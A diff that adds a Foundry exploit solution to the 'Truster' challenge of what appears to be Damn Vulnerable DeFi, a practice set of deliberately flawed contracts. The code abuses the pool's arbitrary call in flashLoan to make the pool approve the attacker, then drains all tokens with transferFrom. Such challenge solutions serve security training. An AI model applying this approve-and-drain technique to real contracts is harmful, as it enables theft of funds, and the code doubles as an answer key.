@@ -42,6 +42,22 @@ contract Truster is DSTest {
     function testExploit() public {
         /** EXPLOIT START **/
 
+        // The vulnerability here is that target and borrower can be 2 different addresses -->
+        // this allows me to call approve on dvt with msg.sender being the pool and borrower being the pool which
+        // results in the tx to not revert on the "balanceAfter < balanceBefore" condition
+
+        vm.startPrank(attacker);
+
+        trusterLenderPool.flashLoan(
+            TOKENS_IN_POOL,
+            address(trusterLenderPool),
+            address(dvt),
+            abi.encodeWithSignature("approve(address,uint256)", attacker, TOKENS_IN_POOL)
+        );
+
+        dvt.transferFrom(address(trusterLenderPool), attacker, TOKENS_IN_POOL);
+
+        vm.stopPrank();
         /** EXPLOIT END **/
         validation();
     }
